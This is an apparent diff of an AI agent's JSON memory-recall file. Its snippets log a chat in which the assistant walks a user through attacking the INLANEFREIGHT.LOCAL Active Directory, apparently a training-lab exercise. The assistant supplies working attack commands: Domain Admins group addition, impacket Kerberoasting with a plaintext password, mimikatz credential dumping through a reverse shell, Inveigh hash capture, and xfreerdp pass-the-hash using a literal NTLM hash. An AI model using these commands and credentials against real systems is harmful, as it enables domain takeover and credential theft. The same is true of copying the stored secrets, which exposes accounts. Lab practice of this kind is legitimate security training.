+      "snippet": "User: v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies [-] User CT059 doesn't have UF_DONT_REQUIRE_PREAUTH set No path from bloodhound I'm thinking inveigh might work",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "v0.14.0.dev0",
+        "uf-dont-require-preauth",
+        "v0.14.0",
+        "dev0",
+        "copyright",
+        "fortra",
+        "llc",
+        "affiliated"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:179:179": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:179:179",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 179,
+      "endLine": 179,
+      "source": "memory",
+      "snippet": "Assistant: 🔷 **Stop hunting CT059's password.** You don't need it. Look at your BloodHound graph — **CT059 has GenericAll over Domain Admins**. That means **whoever controls CT059** can add anyone to Domain Admins. And since you found CT059 in BloodHound, you know it exists. But",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "stop",
+        "hunting",
+        "ct059",
+        "password",
+        "don't",
+        "need",
+        "look",
+        "bloodhound"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:180:180": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:180:180",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 180,
+      "endLine": 180,
+      "source": "memory",
+      "snippet": "Assistant: /domain ``` If that works (Administrator on MS01 might have delegation or Account Operators rights), then: ```powershell # Add BR086 to Domain Admins as CT059 runas /user:INLANEFREIGHT.LOCAL\\CT059 \"net group \\\"Domain Admins\\\" BR086 /add /domain\" ``` **But wait — even s",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "inlanefreight.local",
+        "domain",
+        "works",
+        "administrator",
+        "ms01",
+        "might",
+        "delegation",
+        "account"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:181:181": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:181:181",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 181,
+      "endLine": 181,
+      "source": "memory",
+      "snippet": "Assistant: another way Try `net group \"Domain Admins\" BR086 /add /domain` first. What happens?",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "another",
+        "way",
+        "try",
+        "net",
+        "group",
+        "domain",
+        "admins",
+        "br086"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:182:182": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:182:182",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 182,
+      "endLine": 182,
+      "source": "memory",
+      "snippet": "User: [media attached: /home/openclaw/.openclaw/media/inbound/file_124---570b2152-a9a3-404a-8216-42f10aaafc21.jpg (image/jpeg) | /home/openclaw/.openclaw/media/inbound/file_124---570b2152-a9a3-404a-8216-42f10aaafc21.jpg] Option 1 didn't work. Wrong passwords. Option 2. didnt' als",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "home/openclaw",
+        "openclaw/media/inbound/file-124",
+        "image/jpeg",
+        "media",
+        "attached",
+        "home",
+        "openclaw",
+        "inbound"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:183:183": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:183:183",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 183,
+      "endLine": 183,
+      "source": "memory",
+      "snippet": "User: >Stop hunting CT059's password. You don't need it. We need it. I can't use CT059 even if no it has generic all. It's also the answer to q10",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "stop",
+        "hunting",
+        "ct059",
+        "password",
+        "don't",
+        "need",
+        "can't",
+        "use"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:184:184": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:184:184",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 184,
+      "endLine": 184,
+      "source": "memory",
+      "snippet": "Assistant: 🔷 You're right — **Q10 asks for CT059's password specifically.** We need to crack it. Fresh approaches: **1. Kerberoast CT059** — check if it has SPNs: ```bash impacket-GetUserSPNs INLANEFREIGHT.LOCAL/BR086:Welcome1 -dc-ip 172.16.7.3 -request-user CT059 -outputfile /t",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "impacket-getuserspns",
+        "inlanefreight.local/br086",
+        "dc-ip",
+        "172.16.7.3",
+        "request-user",
+        "you're",
+        "right",
+        "q10"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:185:185": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:185:185",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 185,
+      "endLine": 185,
+      "source": "memory",
+      "snippet": "Assistant: specifically looking for CT059: ```powershell # On SQL01 via your reverse shell C:\\Windows\\Temp\\mimikatz.exe \"privilege::debug\" \"token:***\" \"sekurlsa::tickets\" \"sekurlsa::logonpasswords\" \"exit\" ``` **5. DCSync CT059's hash** — you need Domain Admin for this, but if we",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "mimikatz.exe",
+        "specifically",
+        "looking",
+        "ct059",
+        "powershell",
+        "sql01",
+        "via",
+        "reverse"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:186:186": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:186:186",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 186,
+      "endLine": 186,
+      "source": "memory",
+      "snippet": "User: We can use this : https://github.com/Kevin-Robertson/Inveigh I've been mentioning inveigh. Responder gave us creds from linux a while ago. Maybe inveight from BR086 works",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "can",
+        "use",
+        "https",
+        "github.com",
+        "kevin",
+        "robertson",
+        "inveigh",
+        "i've"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:187:187": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:187:187",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 187,
+      "endLine": 187,
+      "source": "memory",
+      "snippet": "Assistant: 🔷 Inveigh is solid, but there's a catch: **CT059 needs to actively authenticate to MS01** for Inveigh to capture anything. If CT059 is dormant, Inveigh will sit idle. **Two-pronged approach:** **A. Set up Inveigh on MS01** (as Administrator for best results): ```power",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "two-pronged",
+        "inveigh",
+        "solid",
+        "but",
+        "there's",
+        "catch",
+        "ct059",
+        "needs"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:188:188": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:188:188",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 188,
+      "endLine": 188,
+      "source": "memory",
+      "snippet": "Assistant: services sc query | findstr /i ct059 Get-WmiObject Win32_Service | Where-Object { $_.StartName -like \"*CT059*\" } # If found, restart the service to trigger auth: sc stop <ServiceName> sc start <ServiceName> ``` **C. Parallel track — Kerberoast CT059** (more likely to y",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "get-wmiobject",
+        "win32-service",
+        "where-object",
+        "services",
+        "query",
+        "findstr",
+        "ct059",
+        "get"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:189:189": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:189:189",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 189,
+      "endLine": 189,
+      "source": "memory",
+      "snippet": "User: Got an error when running from evil-winrim *Evil-WinRM* PS C:\\Windows\\Temp> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y [*] Inveigh 1.506 started at 2026-05-01T10:42:42 [+] Elevated Privilege Mode = Enabled [+] Primary IP Address = 172.16.7.50 [+] Spoofer IP Add",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "evil-winrim",
+        "evil-winrm",
+        "invoke-inveigh",
+        "1.506",
+        "2026-05-01t10",
+        "172.16.7.50",
+        "got",
+        "error"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:190:190": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:190:190",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 190,
+      "endLine": 190,
+      "source": "memory",
+      "snippet": "User: Machine Account Capture = Disabled [+] Console Output = Full [+] File Output = Enabled [+] Output Directory = C:\\Windows\\Temp Warning: [!] Run Stop-Inveigh to stop [*] Press any key to stop console output Cannot see if a key has been pressed when either application does not",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "stop-inveigh",
+        "machine",
+        "account",
+        "capture",
+        "disabled",
+        "console",
+        "output",
+        "full"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:191:191": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:191:191",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 191,
+      "endLine": 191,
+      "source": "memory",
+      "snippet": "Assistant: The error is the interactive \"press any key\" prompt — evil-winRM's PTY can't handle it. Run Inveigh as a **background job** instead: **In your evil-winRM session:** ```powershell # Stop any stuck instance first Stop-Inveigh # Run as background job Start-Job -ScriptBloc",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "evil-winrm",
+        "stop-inveigh",
+        "start-job",
+        "error",
+        "interactive",
+        "press",
+        "any",
+        "key"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-01.txt:192:192": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-01.txt:192:192",
+      "path": "memory/.dreams/session-corpus/2026-05-01.txt",
+      "startLine": 192,
+      "endLine": 192,
+      "source": "memory",
+      "snippet": "Assistant: /query /fo LIST /v | findstr /i ct059 ``` **Check Inveigh output after a minute:** ```powershell # Check job status Get-Job | Receive-Job # Read the log file Get-Content C:\\Windows\\Temp\\Inveigh-Log.txt -Tail 50 ``` Run the background job + service check. What services",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "23c989536796"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "get-job",
+        "receive-job",
+        "get-content",
+        "inveigh-log.txt",
+        "query",
+        "list",
+        "findstr",
+        "ct059"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:1:1": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:1:1",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 1,
+      "endLine": 1,
+      "source": "memory",
+      "snippet": "User: We can try getting another shell from evil-winRM that can allow for interactive input and properly use inveight right? or is there a way to make evil-winrm allow for interactive?",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "evil-winrm",
+        "can",
+        "try",
+        "getting",
+        "another",
+        "shell",
+        "evil",
+        "winrm"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:2:2": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:2:2",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 2,
+      "endLine": 2,
+      "source": "memory",
+      "snippet": "Assistant: **No need for another shell.** The cleanest fix is `Invoke-Inveigh -RunTime` — it auto-exits after X minutes, no key press needed: ```powershell # In evil-winRM, run Inveigh for 10 minutes then auto-stop Invoke-Inveigh -RunTime 10 -ConsoleOutput Y -FileOutput Y -Output",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "invoke-inveigh",
+        "auto-exits",
+        "evil-winrm",
+        "auto-stop",
+        "need",
+        "another",
+        "shell",
+        "cleanest"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:3:3": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:3:3",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 3,
+      "endLine": 3,
+      "source": "memory",
+      "snippet": "Assistant: (no console loop at all):** ```powershell Start-Job -ScriptBlock { Import-Module C:\\Windows\\Temp\\Inveigh.ps1 Invoke-Inveigh -RunTime 10 -FileOutput Y -OutputDir C:\\Windows\\Temp } ``` **Check results after a few minutes:** ```powershell Get-Content C:\\Windows\\Temp\\Invei",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "start-job",
+        "import-module",
+        "inveigh.ps1",
+        "invoke-inveigh",
+        "get-content",
+        "console",
+        "loop",
+        "all"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:4:4": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:4:4",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 4,
+      "endLine": 4,
+      "source": "memory",
+      "snippet": "User: I'll try those out. Can I also use xfreerdp to login using CT059 hash?",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "i'll",
+        "try",
+        "those",
+        "out",
+        "can",
+        "use",
+        "xfreerdp",
+        "login"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:5:5": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:5:5",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 5,
+      "endLine": 5,
+      "source": "memory",
+      "snippet": "Assistant: You can, but **we don't have CT059's hash yet** — that's what Inveigh and the service restart are trying to capture. Once you get it, **xfreerdp pass-the-hash syntax** is: ```bash xfreerdp3 /v:172.16.7.50 /u:CT059 /pth:<NTLM_HASH> /cert:ignore ``` But that's for **afte",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "pass-the-hash",
+        "172.16.7.50",
+        "ntlm-hash",
+        "can",
+        "but",
+        "don't",
+        "ct059",
+        "hash"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:6:6": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:6:6",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 6,
+      "endLine": 6,
+      "source": "memory",
+      "snippet": "User: I meant Administrators hash which we are using for evil-winrm. This way we get interactive shell. Just thinking of alternatives to try",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "evil-winrm",
+        "meant",
+        "administrators",
+        "hash",
+        "which",
+        "evil",
+        "winrm",
+        "way"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:7:7": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:7:7",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 7,
+      "endLine": 7,
+      "source": "memory",
+      "snippet": "Assistant: 🔷 Smart — **xfreerdp pass-the-hash** gives you a real interactive GUI where Inveigh's console input works natively. **Syntax:** ```bash xfreerdp3 /v:172.16.7.50 /u:Administrator /pth:bdaffbfe64f1fc646a3353be1c2c3c99 /cert:ignore ``` If that fails, try with domain cont",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "pass-the-hash",
+        "172.16.7.50",
+        "smart",
+        "xfreerdp",
+        "pass",
+        "hash",
+        "gives",
+        "real"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:8:8": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:8:8",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 8,
+      "endLine": 8,
+      "source": "memory",
+      "snippet": "Assistant: hash?",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "hash"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:9:9": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:9:9",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 9,
+      "endLine": 9,
+      "source": "memory",
+      "snippet": "User: [media attached: /home/openclaw/.openclaw/media/inbound/file_125---b08e80aa-a673-46d1-9bdf-9b21ed9c3ca2.jpg (image/jpeg) | /home/openclaw/.openclaw/media/inbound/file_125---b08e80aa-a673-46d1-9bdf-9b21ed9c3ca2.jpg] To send an image back, prefer the message tool (media/path/",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "home/openclaw",
+        "openclaw/media/inbound/file-125",
+        "image/jpeg",
+        "media/path",
+        "media",
+        "attached",
+        "home",
+        "openclaw"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:10:10": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:10:10",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 10,
+      "endLine": 10,
+      "source": "memory",
+      "snippet": "Assistant: Right — that error means **MS01's local Administrator account doesn't allow NTLM hash authentication for RDP** (common with \"Network Security: LAN Manager authentication level\" policies set to NTLMv2 only). Back to **evil-winRM**. Let's make Inveigh work properly witho",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "network",
+        "evil-winrm",
+        "right",
+        "error",
+        "means",
+        "ms01",
+        "local",
+        "administrator"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:11:11": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:11:11",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 11,
+      "endLine": 11,
+      "source": "memory",
+      "snippet": "Assistant: Get-WmiObject Win32_Service | Where-Object { $_.StartName -like \"*CT059*\" } | Select-Object Name, StartName, State # If found, restart them: Restart-Service -Name \"<ServiceName>\" ``` **Step 4 — Check results:** ```powershell # After a few minutes, check the job Get-Job",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "get-wmiobject",
+        "win32-service",
+        "where-object",
+        "select-object",
+        "restart-service",
+        "get-job",
+        "get",
+        "wmiobject"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:12:12": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:12:12",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 12,
+      "endLine": 12,
+      "source": "memory",
+      "snippet": "User: [media attached: /home/openclaw/.openclaw/media/inbound/file_125---b08e80aa-a673-46d1-9bdf-9b21ed9c3ca2.jpg (image/jpeg) | /home/openclaw/.openclaw/media/inbound/file_125---b08e80aa-a673-46d1-9bdf-9b21ed9c3ca2.jpg] It didn't work. Back to evil-winrm for now",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "home/openclaw",
+        "openclaw/media/inbound/file-125",
+        "image/jpeg",
+        "evil-winrm",
+        "media",
+        "attached",
+        "home",
+        "openclaw"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:13:13": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:13:13",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 13,
+      "endLine": 13,
+      "source": "memory",
+      "snippet": "User: Pre-compaction memory flush. Store durable memories only in memory/2026-05-02.md (create memory/ if needed). Treat workspace bootstrap/reference files such as MEMORY.md, DREAMS.md, SOUL.md, TOOLS.md, and AGENTS.md as read-only during this flush; never overwrite, replace, or",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "pre-compaction",
+        "memory/2026-05-02.md",
+        "bootstrap/reference",
+        "memory.md",
+        "dreams.md",
+        "soul.md",
+        "tools.md",
+        "agents.md"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:14:14": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:14:14",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 14,
+      "endLine": 14,
+      "source": "memory",
+      "snippet": "Assistant: 🔷 Session memories flushed to `memory/2026-05-02.md`. Ready to continue the CT059 hunt whenever you are.",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
